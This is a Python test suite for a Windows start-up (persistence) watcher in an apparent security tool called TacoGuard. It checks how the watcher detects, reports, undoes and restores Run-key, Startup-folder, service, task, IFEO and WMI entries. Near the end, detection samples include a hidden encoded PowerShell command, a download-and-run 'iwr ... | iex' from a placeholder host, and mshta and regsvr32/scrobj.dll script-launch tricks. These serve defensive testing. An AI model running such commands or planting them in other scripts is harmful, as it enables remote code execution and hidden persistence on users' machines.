"""The start-up (persistence) watch. Every registry change happens under
HKCU\\Software\\TacoGuardTest\\<random> (deleted afterwards) and every folder is in tmp_path: the
real Run key, Startup folder, services and tasks are never changed."""
from __future__ import annotations

import json
import os
import struct
import subprocess
import threading
import time
import uuid
import winreg

import pytest

from tacoguard.guard import persistence as P
from tacoguard.model import SCANNED, Confidence, FileResult, Finding

HKCU = winreg.HKEY_CURRENT_USER
TEST_PARENT = r"Software\TacoGuardTest"


# ---- helpers ----------------------------------------------------------------------------------------
def _delete_tree(hive, path: str) -> None:
    try:
        with winreg.OpenKey(hive, path, 0, winreg.KEY_READ | winreg.KEY_WRITE) as k:
            while True:
                try:
                    sub = winreg.EnumKey(k, 0)
                except OSError:
                    break
                _delete_tree(hive, path + "\\" + sub)
        winreg.DeleteKey(hive, path)
    except FileNotFoundError:
        pass


def _set(path: str, name: str, data, typ=winreg.REG_SZ) -> None:
    with winreg.CreateKeyEx(HKCU, path, 0, winreg.KEY_WRITE) as k:
        winreg.SetValueEx(k, name, 0, typ, data)


def _get(path: str, name: str):
    with winreg.OpenKey(HKCU, path, 0, winreg.KEY_READ) as k:
        return winreg.QueryValueEx(k, name)


def _delete_value(path: str, name: str) -> None:
    with winreg.OpenKey(HKCU, path, 0, winreg.KEY_WRITE) as k:
        winreg.DeleteValue(k, name)


class FakeChecker:
    """Same two methods as guard.checker.RealtimeChecker."""

    def __init__(self, findings=None):
        self.calls: list[str] = []
        self.reports: list = []
        self.findings = findings or []

    def check_path(self, display_path):
        self.calls.append(display_path)
        return FileResult(path=display_path, status=SCANNED, sha256="ab" * 32, size=10,
                          findings=list(self.findings))

    def report(self, result, kind, extra=None):
        self.reports.append((result, kind, extra))
        return None


@pytest.fixture
def reg_base():
    base = TEST_PARENT + "\\" + uuid.uuid4().hex
    winreg.CreateKeyEx(HKCU, base + r"\Run", 0, winreg.KEY_WRITE).Close()
    yield base
    _delete_tree(HKCU, base)
    try:                                   # the shared parent, when no other test key is left
        winreg.DeleteKey(HKCU, TEST_PARENT)
    except OSError:
        pass


@pytest.fixture
def roots(reg_base, tmp_path):
    (tmp_path / "startup").mkdir()
    (tmp_path / "startup_all").mkdir()
    return {
        "run:HKCU": (HKCU, reg_base + r"\Run"),
        "runonce:HKCU": (HKCU, reg_base + r"\RunOnce"),
        "run:HKLM": (HKCU, reg_base + r"\RunAllUsers"),     # an "all users" source, kept in the test key
        "winlogon:HKLM": (HKCU, reg_base + r"\Winlogon"),
        "ifeo:HKLM": (HKCU, reg_base + r"\IFEO"),
        "appinit:HKLM": (HKCU, reg_base + r"\Windows"),
        "service": (HKCU, reg_base + r"\Services"),
        "startup:user": str(tmp_path / "startup"),
        "startup:common": str(tmp_path / "startup_all"),
    }


@pytest.fixture
def program(tmp_path):
    """A harmless stand-in program file (plain text, never run)."""
    d = tmp_path / "Apps" / "My Tool"
    d.mkdir(parents=True)
    p = d / "upd.exe"
    p.write_bytes(b"harmless test file, not a program\n")
    return str(p)


def _watcher(settings, store, roots, checker=None, **kw):
    return P.PersistenceWatcher(settings, store, checker if checker is not None else FakeChecker(),
                                roots=roots, **kw)


def _events(store):
    return [e for e in store.list_guard_events() if e["kind"] == "persistence"]


# ---- baseline, new, changed, removed -------------------------------------------------------------
def test_baseline_gives_no_events(settings, store, roots, reg_base, program):
    _set(reg_base + r"\Run", "Existing", f'"{program}" --start')
    chk = FakeChecker()
    w = _watcher(settings, store, roots, chk)
    assert w.scan_now() == []
    row = store.get_persistence("run:HKCU:Existing")
    assert row["state"] == "baseline" and row["source"] == "run"
    assert row["target"] == program and row["location"] == "Your Run key"
    assert _events(store) == [] and chk.calls == []
    assert w.scan_now() == []
    assert w.status()["checked"] == 1


def test_new_run_value_gives_one_event_and_checks_the_file(settings, store, roots, reg_base, program):
    _set(reg_base + r"\Run", "Existing", "explorer.exe")
    chk = FakeChecker()
    w = _watcher(settings, store, roots, chk)
    w.scan_now()
    _set(reg_base + r"\Run", "Updater", f'"{program}" /quiet')
    assert w.scan_now() == ["run:HKCU:Updater"]
    assert chk.calls == [program]
    evs = _events(store)
    assert len(evs) == 1
    ev = evs[0]
    assert ev["level"] == "warning" and ev["data"] == {"key": "run:HKCU:Updater"}
    assert ev["title"] == f"New start-up entry: 'Updater' runs {program}"
    assert "your Run key" in ev["message"] and "Undo" in ev["message"]
    assert "nothing wrong" in ev["message"]
    row = store.get_persistence("run:HKCU:Updater")
    assert row["state"] == "new" and row["event_id"] == ev["id"]
    assert w.scan_now() == [] and len(_events(store)) == 1      # no repeat


def test_flagged_file_gives_the_files_level(settings, store, roots, reg_base, program):
    chk = FakeChecker([Finding("yara", "Test_Rule", Confidence.HIGH, "test rules")])
    w = _watcher(settings, store, roots, chk)
    w.scan_now()
    _set(reg_base + r"\Run", "Bad", program)
    w.scan_now()
    ev = _events(store)[0]
    assert ev["level"] == "malware" and "found malware" in ev["message"]
    assert ev["findings"] and ev["findings"][0]["rule"] == "Test_Rule"


def test_changed_command_gives_an_event(settings, store, roots, reg_base, program, tmp_path):
    _set(reg_base + r"\Run", "Helper", "explorer.exe")
    w = _watcher(settings, store, roots)
    w.scan_now()
    _set(reg_base + r"\Run", "Helper", f'"{program}"')
    assert w.scan_now() == ["run:HKCU:Helper"]
    ev = _events(store)[0]
    assert ev["title"].startswith("Changed start-up entry: 'Helper' now runs")
    assert "used to run: explorer.exe" in ev["message"]
    row = store.get_persistence("run:HKCU:Helper")
    assert row["command"] == f'"{program}"' and row["state"] == "new"


def test_removed_entry(settings, store, roots, reg_base, program):
    _set(reg_base + r"\Run", "Old", "explorer.exe")
    w = _watcher(settings, store, roots)
    w.scan_now()
    _set(reg_base + r"\Run", "Fresh", program)
    w.scan_now()
    _delete_value(reg_base + r"\Run", "Old")
    _delete_value(reg_base + r"\Run", "Fresh")
    w.scan_now()
    assert store.get_persistence("run:HKCU:Old")["state"] == "removed"
    row = store.get_persistence("run:HKCU:Fresh")
    assert row["state"] == "removed"
    ev = store.get_guard_event(row["event_id"])
    assert ev["state"] == "resolved" and ev["action"] == "removed"
    assert len(_events(store)) == 1
    # a baseline entry that comes back is not news
    _set(reg_base + r"\Run", "Old", "explorer.exe")
    w.scan_now()
    assert store.get_persistence("run:HKCU:Old")["state"] == "baseline"
    assert len(_events(store)) == 1


def test_empty_source_is_baselined_once(settings, store, roots, reg_base, program):
    """A source with no entries at its first pass is remembered: its first entry is reported."""
    w = _watcher(settings, store, roots)
    w.scan_now()                                   # every test source is empty
    assert store.list_persistence() == []
    w2 = _watcher(settings, store, roots)          # a new start of the guard
    _set(reg_base + r"\RunOnce", "Once", program)
    assert w2.scan_now() == ["runonce:HKCU:Once"]
    assert len(_events(store)) == 1


def test_keep(settings, store, roots, reg_base, program):
    w = _watcher(settings, store, roots)
    w.scan_now()
    _set(reg_base + r"\Run", "Mine", program)
    w.scan_now()
    page = _watcher(settings, store, roots, checker=None)     # the page's own instance
    page.keep("run:HKCU:Mine")
    row = store.get_persistence("run:HKCU:Mine")
    assert row["state"] == "kept"
    ev = store.get_guard_event(row["event_id"])
    assert ev["state"] == "resolved" and ev["action"] == "kept"
    with pytest.raises(ValueError):
        page.keep("run:HKCU:NoSuchThing")


# ---- undo / restore ----------------------------------------------------------------------------------
@pytest.mark.parametrize("typ,data", [(winreg.REG_SZ, "C:\\Tools\\x.exe --tray"),
                                      (winreg.REG_EXPAND_SZ, "%LOCALAPPDATA%\\Tools\\x.exe")])
def test_undo_and_restore_run_value(settings, store, roots, reg_base, typ, data):
    run = reg_base + r"\Run"
    w = _watcher(settings, store, roots)
    w.scan_now()
    _set(run, "Tray", data, typ)
    w.scan_now()
    page = _watcher(settings, store, roots, checker=None)
    msg = page.undo("run:HKCU:Tray")
    assert "Turned off 'Tray'" in msg and "Restore" in msg
    with pytest.raises(FileNotFoundError):
        _get(run, "Tray")
    row = store.get_persistence("run:HKCU:Tray")
    assert row["state"] == "undone"
    b = json.loads(row["backup"])
    assert b["type"] == typ and b["name"] == "Tray"
    assert store.get_guard_event(row["event_id"])["action"] == "undone"
    # the guard's next pass leaves an undone entry alone
    assert w.scan_now() == []
    assert store.get_persistence("run:HKCU:Tray")["state"] == "undone"
    with pytest.raises(ValueError):
        page.undo("run:HKCU:Tray")

    msg = page.restore("run:HKCU:Tray")
    assert "back" in msg
    assert _get(run, "Tray") == (data, typ)
    row = store.get_persistence("run:HKCU:Tray")
    assert row["state"] == "kept" and row["backup"] == ""
    assert w.scan_now() == [] and len(_events(store)) == 1


def test_restore_refuses_to_overwrite(settings, store, roots, reg_base):
    run = reg_base + r"\Run"
    _set(run, "Tray", "a.exe")
    w = _watcher(settings, store, roots)
    w.scan_now()
    w.undo("run:HKCU:Tray")
    _set(run, "Tray", "something-else.exe")
    with pytest.raises(ValueError, match="already there"):
        w.restore("run:HKCU:Tray")
    assert _get(run, "Tray")[0] == "something-else.exe"
    assert store.get_persistence("run:HKCU:Tray")["state"] == "undone"


def test_undone_entry_that_comes_back_is_reported(settings, store, roots, reg_base, program):
    run = reg_base + r"\Run"
    _set(run, "Sticky", program)
    w = _watcher(settings, store, roots)
    w.scan_now()
    w.undo("run:HKCU:Sticky")
    _set(run, "Sticky", program)          # something adds it again
    assert w.scan_now() == ["run:HKCU:Sticky"]
    ev = _events(store)[0]
    assert ev["title"].startswith("Start-up entry came back: 'Sticky'")
    assert store.get_persistence("run:HKCU:Sticky")["state"] == "new"


def test_undo_of_other_sources_raises_plain_words(settings, store, roots, reg_base, program):
    _set(reg_base + r"\RunAllUsers", "Everyone", program)
    with winreg.CreateKeyEx(HKCU, reg_base + r"\Services\TestSvc", 0, winreg.KEY_WRITE) as k:
        winreg.SetValueEx(k, "ImagePath", 0, winreg.REG_EXPAND_SZ, f'"{program}" -service')
        winreg.SetValueEx(k, "Start", 0, winreg.REG_DWORD, 2)
    w = _watcher(settings, store, roots)
    w.scan_now()
    with pytest.raises(ValueError) as e1:
        w.undo("run:HKLM:Everyone")
    assert "administrator rights" in str(e1.value) and "Task Manager" in str(e1.value)
    with pytest.raises(ValueError) as e2:
        w.undo("service:TestSvc")
    assert "Services" in str(e2.value)
    assert _get(reg_base + r"\RunAllUsers", "Everyone")[0] == program      # untouched
    with pytest.raises(ValueError, match="does not know"):
        w.undo("run:HKCU:Nothing")


def _attrs(path: str) -> int:
    return os.stat(path).st_file_attributes


def test_startup_folder_file_undo_and_restore(settings, store, roots, tmp_path):
    folder = tmp_path / "startup"
    f = folder / "helper.cmd"
    f.write_bytes(b"@echo harmless test\r\n")
    os.utime(f, (1_700_000_000, 1_700_000_000))
    w = _watcher(settings, store, roots)
    w.scan_now()
    key = "startup:user:helper.cmd"
    row = store.get_persistence(key)
    assert row["state"] == "baseline" and row["target"] == str(f)
    os.chmod(f, 0o444)                                    # read-only: undo must still work
    msg = w.undo(key)
    assert "Turned off" in msg and not f.exists()
    b = json.loads(store.get_persistence(key)["backup"])
    backup = b["backup"]
    assert os.path.exists(backup) and os.path.dirname(backup) == str(settings.guard_dir / "startup-backup")
    assert w.scan_now() == []
    w.restore(key)
    assert f.read_bytes() == b"@echo harmless test\r\n"
    assert int(os.stat(f).st_mtime) == 1_700_000_000
    assert _attrs(str(f)) & 0x1                           # still read-only
    assert not os.path.exists(backup)
    assert store.get_persistence(key)["state"] == "kept"
    os.chmod(f, 0o666)
    # restore refuses when a file with that name is back
    w.undo(key)
    f.write_bytes(b"other\r\n")
    with pytest.raises(ValueError, match="already in your Startup folder"):
        w.restore(key)
    assert f.read_bytes() == b"other\r\n"


def test_all_users_startup_folder_cannot_be_undone(settings, store, roots, tmp_path):
    (tmp_path / "startup_all" / "x.cmd").write_bytes(b"rem harmless\r\n")
    w = _watcher(settings, store, roots)
    w.scan_now()
    with pytest.raises(ValueError, match="administrator rights"):
        w.undo("startup:common:x.cmd")
    assert (tmp_path / "startup_all" / "x.cmd").exists()


# ---- other sources -----------------------------------------------------------------------------------
def test_winlogon_ifeo_appinit_services(settings, store, roots, reg_base, program):
    _set(reg_base + r"\Winlogon", "Shell", "explorer.exe")
    _set(reg_base + r"\Winlogon", "Userinit", os.environ["SystemRoot"] + "\\system32\\userinit.exe,")
    with winreg.CreateKeyEx(HKCU, reg_base + r"\IFEO\notepad.exe", 0, winreg.KEY_WRITE) as k:
        winreg.SetValueEx(k, "GlobalFlag", 0, winreg.REG_DWORD, 0)
    with winreg.CreateKeyEx(HKCU, reg_base + r"\Services\ManualSvc", 0, winreg.KEY_WRITE) as k:
        winreg.SetValueEx(k, "ImagePath", 0, winreg.REG_EXPAND_SZ, program)
        winreg.SetValueEx(k, "Start", 0, winreg.REG_DWORD, 3)              # manual: not counted
    w = _watcher(settings, store, roots)
    w.scan_now()
    assert store.list_persistence() == []                 # Windows' defaults are not entries
    _set(reg_base + r"\Winlogon", "Userinit", os.environ["SystemRoot"] + f"\\system32\\userinit.exe,{program}")
    with winreg.CreateKeyEx(HKCU, reg_base + r"\IFEO\notepad.exe", 0, winreg.KEY_WRITE) as k:
        winreg.SetValueEx(k, "Debugger", 0, winreg.REG_SZ, f'"{program}"')
    _set(reg_base + r"\Windows", "AppInit_DLLs", program)
    with winreg.CreateKeyEx(HKCU, reg_base + r"\Services\AutoSvc", 0, winreg.KEY_WRITE) as k:
        winreg.SetValueEx(k, "ImagePath", 0, winreg.REG_EXPAND_SZ, f'"{program}" -k')
        winreg.SetValueEx(k, "Start", 0, winreg.REG_DWORD, 2)
    new = sorted(w.scan_now())
    assert new == ["appinit:HKLM:AppInit_DLLs", "ifeo:HKLM:notepad.exe", "service:AutoSvc",
                   "winlogon:HKLM:Userinit"]
    for k in new:
        assert store.get_persistence(k)["target"] == program, k
    msgs = {e["data"]["key"]: e["message"] for e in _events(store)}
    assert "instead of notepad.exe" in msgs["ifeo:HKLM:notepad.exe"]
    assert "Windows service named AutoSvc" in msgs["service:AutoSvc"]


def test_new_shortcut_in_startup_folder(settings, store, roots, tmp_path, program):
    w = _watcher(settings, store, roots)
    w.scan_now()
    (tmp_path / "startup" / "desktop.ini").write_bytes(b"[.ShellClassInfo]\r\n")
    (tmp_path / "startup" / "Updater.lnk").write_bytes(_lnk(program, "--hidden"))
    assert w.scan_now() == ["startup:user:Updater.lnk"]
    ev = _events(store)[0]
    assert ev["title"] == f"New start-up entry: 'Updater' runs {program}"
    assert store.get_persistence("startup:user:Updater.lnk")["command"] == f'"{program}" --hidden'


# ---- command lines -------------------------------------------------------------------------------------
def test_command_parsing(tmp_path, monkeypatch, program):
    sysroot = os.environ["SystemRoot"]
    cmd_exe = os.path.join(sysroot, "System32", "cmd.exe")
    dll = tmp_path / "Lib Dir" / "thing.dll"
    dll.parent.mkdir()
    dll.write_bytes(b"harmless")
    script = tmp_path / "s.vbs"
    script.write_bytes(b"' harmless")
    bat = tmp_path / "start me.cmd"
    bat.write_bytes(b"rem harmless")
    norm = os.path.normcase

    # quoted, with arguments
    assert P.split_command(f'"{program}" --tray "two words"') == (program, ["--tray", "two words"])
    assert P.resolve_target(f'"{program}" --tray') == program
    # unquoted with spaces: the longest existing prefix wins
    assert P.resolve_target(f"{program} --minimized") == program
    assert P.split_command(f"{program} -a b")[1] == ["-a", "b"]
    # bare names in Windows' folders
    assert norm(P.resolve_target("cmd.exe /c echo hi")) == norm(cmd_exe)
    assert norm(P.resolve_target("cmd")) == norm(cmd_exe)
    # rundll32: the DLL is what runs
    assert P.resolve_target(f'rundll32.exe "{dll}",EntryPoint') == str(dll)
    assert P.resolve_target(f"rundll32.exe {tmp_path}\\x.dll,Entry") .lower().endswith("rundll32.exe")
    nospace = tmp_path / "plain.dll"
    nospace.write_bytes(b"harmless")
    assert P.resolve_target(f"rundll32 {nospace},Run arg") == str(nospace)
    # environment variables
    monkeypatch.setenv("TG_TEST_DIR", str(tmp_path / "Apps"))
    assert P.resolve_target(r'"%TG_TEST_DIR%\My Tool\upd.exe" -x') == program
    assert P.expand_env("%TG_TEST_DIR%\\a %NO_SUCH_VAR_TG%") == str(tmp_path / "Apps") + "\\a %NO_SUCH_VAR_TG%"
    # script hosts: the script is what runs
    assert P.resolve_target(f'wscript.exe //B "{script}"') == str(script)
    assert P.resolve_target(f'powershell.exe -NoProfile -File "{script}" -x') == str(script)
    assert P.resolve_target(f'cmd.exe /c "{bat}"') == str(bat)
    # driver and NT path forms (services)
    assert norm(P.resolve_target(r"\SystemRoot\System32\cmd.exe")) == norm(cmd_exe)
    assert norm(P.resolve_target(r"system32\cmd.exe")) == norm(cmd_exe)
    assert P.resolve_target("\\??\\" + program) == program
    # nothing found
    assert P.resolve_target(r"C:\No Such Folder TG\x.exe -a") == ""
    assert P.resolve_target("") == ""


# ---- shortcuts --------------------------------------------------------------------------------------------
def _lnk(target: str, args: str = "") -> bytes:
    """A minimal shell link (MS-SHLLINK): header, LinkInfo with a local base path, arguments."""
    flags = 0x2 | 0x80 | (0x20 if args else 0)
    header = struct.pack("<I16sII", 0x4C, bytes.fromhex("0114020000000000c000000000000046"), flags, 0x20)
    header += b"\x00" * 24 + struct.pack("<IiIHHII", 0, 0, 1, 0, 0, 0, 0)
    assert len(header) == 0x4C
    volume = struct.pack("<IIII", 0x11, 3, 0x1234, 0x10) + b"\x00"
    base = target.encode("mbcs") + b"\x00"
    hdr = 0x1C
    li_body_off = hdr
    lbp_off = li_body_off + len(volume)
    cps_off = lbp_off + len(base)
    size = cps_off + 1
    linkinfo = struct.pack("<7I", size, hdr, 1, li_body_off, lbp_off, 0, cps_off) + volume + base + b"\x00"
    data = header + linkinfo
    if args:
        data += struct.pack("<H", len(args)) + args.encode("utf-16-le")
    return data + b"\x00\x00\x00\x00"


def test_parse_lnk_minimal(program):
    info = P.parse_lnk(_lnk(program, '--hidden "a b"'))
    assert info["target"] == program and info["args"] == '--hidden "a b"'
    assert P.parse_lnk(b"not a shortcut") is None
    assert P.parse_lnk(_lnk(program)[:0x60]) is None          # cut short: no crash


def test_parse_lnk_made_by_windows(tmp_path, program):
    lnk = tmp_path / "made.lnk"
    script = ("$s=(New-Object -ComObject WScript.Shell).CreateShortcut($env:TG_LNK);"
              "$s.TargetPath=$env:TG_TARGET;$s.Arguments='--hidden \"x y\"';$s.Save()")
    env = dict(os.environ, TG_LNK=str(lnk), TG_TARGET=program)
    try:
        subprocess.run(["powershell.exe", "-NoProfile", "-NonInteractive", "-Command", script], env=env,
                       capture_output=True, timeout=60, creationflags=0x08000000)
    except (OSError, subprocess.SubprocessError):
        pytest.skip("PowerShell is not available")
    if not lnk.exists():
        pytest.skip("Windows did not make the shortcut")
    info = P.parse_lnk(lnk.read_bytes())
    assert os.path.normcase(info["target"]) == os.path.normcase(program)
    assert info["args"] == '--hidden "x y"'


# ---- scheduled tasks ---------------------------------------------------------------------------------------
TASKS_XML = """
<Tasks>


<!-- \\Vendor\\Updater -->

<Task version="1.3" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><Description>Keeps &lt;Vendor&gt; up to date</Description></RegistrationInfo>
  <Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers>
  <Settings><Enabled>true</Enabled></Settings>
  <Actions Context="Author">
    <Exec>
      <Command>"%TG_TASK_DIR%\\upd.exe"</Command>
      <Arguments>/check &amp; /quiet</Arguments>
    </Exec>
  </Actions>
</Task>

<!-- \\Switched Off -->

<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers><BootTrigger><Enabled>false</Enabled></BootTrigger></Triggers>
  <Settings><Enabled>false</Enabled></Settings>
  <Actions><Exec><Command>C:\\x.exe</Command></Exec></Actions>
</Task>

<!-- \\Microsoft\\Windows\\ComThing -->

<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Settings><Enabled>true</Enabled></Settings>
  <Actions><ComHandler><ClassId>{00000000-1111-2222-3333-444444444444}</ClassId><Data>x</Data></ComHandler></Actions>
</Task>

<!-- \\Broken -->

<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Settings><Enabled>true</Enabled></Settings>
  <Actions><Exec><Command>C:\\broken.exe</Command><Arguments>a &bogus; b</Arguments></Exec></Actions>
</Task>

</Tasks>
"""


def test_parse_tasks_xml():
    tasks = {t["path"]: t for t in P.parse_tasks_xml(TASKS_XML)}
    assert set(tasks) == {r"\Vendor\Updater", r"\Switched Off", r"\Microsoft\Windows\ComThing", r"\Broken"}
    up = tasks[r"\Vendor\Updater"]
    assert up["enabled"] and up["exec"] == [('"%TG_TASK_DIR%\\upd.exe"', "/check & /quiet")]
    assert tasks[r"\Switched Off"]["enabled"] is False
    assert tasks[r"\Microsoft\Windows\ComThing"]["com"][0][0] == "{00000000-1111-2222-3333-444444444444}"
    assert tasks[r"\Broken"]["exec"][0][0] == r"C:\broken.exe"       # read by the fallback
    assert P.parse_tasks_xml("") == [] and P.parse_tasks_xml("garbage <!-- \\x --> <Task") == []


def test_tasks_source(settings, store, roots, tmp_path, monkeypatch, program):
    monkeypatch.setenv("TG_TASK_DIR", os.path.dirname(program))
    xml = {"text": TASKS_XML}
    calls = []

    def runner():
        calls.append(1)
        return xml["text"], 0.01

    w = _watcher(settings, store, {**roots, "task": runner})
    w.scan_now()
    assert store.get_persistence(r"task:\Vendor\Updater")["target"] == program
    assert store.get_persistence(r"task:\Switched Off") is None          # disabled tasks do not run
    added = """
<!-- \\Evil\\Helper -->
<Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"><Settings><Enabled>true</Enabled></Settings>
<Actions><Exec><Command>%TG_TASK_DIR%\\upd.exe</Command><Arguments>-run</Arguments></Exec></Actions></Task>
</Tasks>"""
    xml["text"] = TASKS_XML.replace("</Tasks>", added)
    assert w.scan_now() == [r"task:\Evil\Helper"]
    ev = _events(store)[0]
    assert ev["title"] == f"New start-up entry: 'Helper' runs {program}"
    assert "scheduled task (\\Evil\\Helper)" in ev["message"]
    with pytest.raises(ValueError, match="Task Scheduler"):
        w.undo(r"task:\Evil\Helper")
    # a failed read changes nothing (no "removed")
    xml["text"] = None
    w._seen.clear()
    w.scan_now()
    assert store.get_persistence(r"task:\Evil\Helper")["state"] == "new"
    assert "could not be read" in w.status()["message"]


def test_real_schtasks_output_parses():
    got = P.run_schtasks()
    if got is None:
        pytest.skip("schtasks did not answer")
    text, cpu = got
    tasks = P.parse_tasks_xml(text)
    assert isinstance(tasks, list) and cpu >= 0.0
    assert all(t["path"].startswith("\\") for t in tasks)


# ---- WMI ------------------------------------------------------------------------------------------------------
def test_wmi_denied_is_said_once(settings, store, roots):
    calls = []

    def denied():
        calls.append(1)
        raise P.WmiDenied()

    w = _watcher(settings, store, {**roots, "wmi": denied})
    w.scan_now()
    w.scan_now()
    assert calls == [1]
    assert P.WMI_DENIED_NOTE in w.status()["message"]
    assert _events(store) == []


def test_wmi_entries(settings, store, roots, program):
    items = [{"class": "CommandLineEventConsumer", "name": "SCM helper", "command": "C:\\x.exe"}]
    w = _watcher(settings, store, {**roots, "wmi": lambda: list(items)})
    w.scan_now()
    assert store.get_persistence("wmi:CommandLineEventConsumer:SCM helper")["state"] == "baseline"
    items.append({"class": "CommandLineEventConsumer", "name": "Odd", "command": f'"{program}" -e'})
    assert w.scan_now() == ["wmi:CommandLineEventConsumer:Odd"]
    with pytest.raises(ValueError, match="administrator"):
        w.undo("wmi:CommandLineEventConsumer:Odd")


# ---- the watching thread -------------------------------------------------------------------------------------
def _wait(cond, timeout=5.0):
    end = time.monotonic() + timeout
    while time.monotonic() < end:
        if cond():
            return True
        time.sleep(0.05)
    return cond()


def test_registry_change_is_noticed_by_the_thread(settings, store, roots, reg_base, program):
    w = _watcher(settings, store, {"run:HKCU": roots["run:HKCU"], "runonce:HKCU": roots["runonce:HKCU"]},
                 debounce_s=0.2)
    w.start()
    try:
        assert _wait(lambda: w.status()["state"] == "on")
        _set(reg_base + r"\Run", "Watched", program)
        assert _wait(lambda: len(_events(store)) == 1), "RegNotifyChangeKeyValue did not fire"
        assert _events(store)[0]["data"]["key"] == "run:HKCU:Watched"
        # RunOnce does not exist yet: it is watched through its parent and found when created
        _set(reg_base + r"\RunOnce", "Later", program)
        assert _wait(lambda: len(_events(store)) == 2), "a new key was not noticed"
    finally:
        t0 = time.monotonic()
        w.stop()
        assert time.monotonic() - t0 < 2.0
    assert w._thread is None
    assert w.status()["state"] == "off"


class FakeHub:
    def __init__(self):
        self.subs = {}

    def subscribe(self, root, callback, recursive=True):
        tok = len(self.subs) + 1
        self.subs[tok] = (root, callback, recursive)
        return tok

    def unsubscribe(self, token):
        self.subs.pop(token, None)


def test_startup_folder_through_the_hub(settings, store, roots, tmp_path):
    hub = FakeHub()
    w = P.PersistenceWatcher(settings, store, FakeChecker(), hub=hub,
                             roots={"startup:user": roots["startup:user"]}, debounce_s=0.2)
    w.start()
    try:
        assert _wait(lambda: w.status()["state"] == "on")
        assert [s[0] for s in hub.subs.values()] == [roots["startup:user"]]
        (tmp_path / "startup" / "new.cmd").write_bytes(b"rem harmless\r\n")
        for _root, cb, _rec in list(hub.subs.values()):
            cb(object())
        assert _wait(lambda: len(_events(store)) == 1)
    finally:
        w.stop()
    assert hub.subs == {}


def test_stop_without_start_and_status(settings, store, roots):
    w = _watcher(settings, store, roots)
    assert w.status() == {"state": "off", "message": "The start-up watch is off.", "watched": [], "checked": 0}
    w.stop()
    assert w.status()["state"] == "off"


# ---- review fixes (2026-11-24) -------------------------------------------------------------------------
SYS = os.environ.get("SystemRoot", r"C:\Windows")
POWERSHELL = os.path.join(SYS, "System32", "WindowsPowerShell", "v1.0", "powershell.exe")
CMD = os.path.join(SYS, "System32", "cmd.exe")


def _new_entry(settings, store, roots, reg_base, name, command):
    w = _watcher(settings, store, roots)
    w.scan_now()
    _set(reg_base + r"\Run", name, command)
    assert w.scan_now() == [f"run:HKCU:{name}"]
    (ev,) = _events(store)
    return ev


def test_script_host_with_arguments_is_never_just_info(settings, store, roots, reg_base):
    # a Microsoft-signed Windows tool, but it runs something: never the quiet "info" level
    ev = _new_entry(settings, store, roots, reg_base, "Helper",
                    f'"{POWERSHELL}" -NoProfile -File C:\\nowhere\\helper.ps1')
    assert ev["level"] == "warning"
    assert "Harmful programs" not in ev["message"]          # nothing risky in the command itself


def test_bare_windows_tool_stays_info(settings, store, roots, reg_base):
    ev = _new_entry(settings, store, roots, reg_base, "Console", f'"{CMD}"')
    assert ev["level"] == "info"


@pytest.mark.parametrize("command,words", [
    (f'"{POWERSHELL}" -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA',
     "runs a hidden (encoded) command and runs in a hidden window"),
    (f'"{POWERSHELL}" -WindowStyle Hidden -Command "iwr https://example.invalid/a.ps1 | iex"',
     "downloads something from the internet and runs in a hidden window"),
    ('mshta.exe "javascript:close()"', "runs script code written into the entry itself"),
    ("regsvr32.exe /s /n /u /i:x.sct scrobj.dll", "loads script code through scrobj.dll"),
    ("conhost.exe --headless cmd.exe /c echo harmless", "runs without a window (--headless)"),
])
def test_risky_script_host_commands_are_warnings_with_a_reason(settings, store, roots, reg_base, command, words):
    ev = _new_entry(settings, store, roots, reg_base, "Odd", command)
    assert ev["level"] == "warning"
    assert ev["message"].startswith("It uses the Windows tool ") and words in ev["message"]
    assert "make sure you recognise it" in ev["message"] and "malware" not in ev["message"].lower()


def test_script_host_risk_ignores_ordinary_commands():
    assert P.script_host_risk(r'"C:\Tools\x.exe" --tray') == ("", True, "")
    host, args, risky = P.script_host_risk(f'"{POWERSHELL}" -ExecutionPolicy Bypass -File C:\\x.ps1')
    assert host == "powershell.exe" and args and risky == ""
    assert P.script_host_risk(f'"{CMD}"')[:2] == ("cmd.exe", False)


def test_tacoguards_own_run_value_is_never_reported(settings, store, roots, reg_base, tmp_path, monkeypatch):
    from tacoguard import autostart
    root = tmp_path / "Programs" / "TacoGuard"
    monkeypatch.setenv("TACOGUARD_INSTALL_ROOT", str(root))
    w = _watcher(settings, store, roots)
    w.scan_now()
    _set(reg_base + r"\Run", autostart.VALUE_NAME, autostart.command_for(root))
    assert w.scan_now() == [] and _events(store) == []
    assert store.get_persistence("run:HKCU:TacoGuard")["state"] == "kept"
    # the same name running something else is reported as usual
    _set(reg_base + r"\Run", autostart.VALUE_NAME, r'"C:\Users\Public\x.exe" --background')
    assert w.scan_now() == ["run:HKCU:TacoGuard"]
    (ev,) = _events(store)
    assert ev["level"] == "warning"
    # back to TacoGuard's own command: kept, and that alert is closed
    _set(reg_base + r"\Run", autostart.VALUE_NAME, autostart.command_for(root))
    assert w.scan_now() == []
    assert store.get_persistence("run:HKCU:TacoGuard")["state"] == "kept"
    assert store.get_guard_event(ev["id"])["state"] == "resolved"


def test_undo_cut_off_after_the_removal_counts_as_undone(settings, store, roots, reg_base):
    run = reg_base + r"\Run"
    w = _watcher(settings, store, roots)
    w.scan_now()
    _set(run, "Tray", r"C:\Tools\x.exe --tray")
    w.scan_now()
    key = "run:HKCU:Tray"
    # an undo that stopped after backing up and removing the value, before the row said "undone"
    backup = {"kind": "registry", "hive": "HKCU", "path": run, "name": "Tray", "type": winreg.REG_SZ,
              "data": {"v": r"C:\Tools\x.exe --tray"}, "undone": time.time()}
    store.put_persistence(key, backup=json.dumps(backup))
    _delete_value(run, "Tray")
    assert store.get_persistence(key)["state"] == "new"
    msg = w.undo(key)
    assert "Turned off 'Tray'" in msg
    row = store.get_persistence(key)
    assert row["state"] == "undone" and row["backup"]
    assert store.get_guard_event(row["event_id"])["action"] == "undone"
    w.restore(key)                                     # Put it back still works
    assert _get(run, "Tray") == (r"C:\Tools\x.exe --tray", winreg.REG_SZ)
    # with no backup it is plainly gone
    _delete_value(run, "Tray")
    store.put_persistence(key, state="new", backup="")
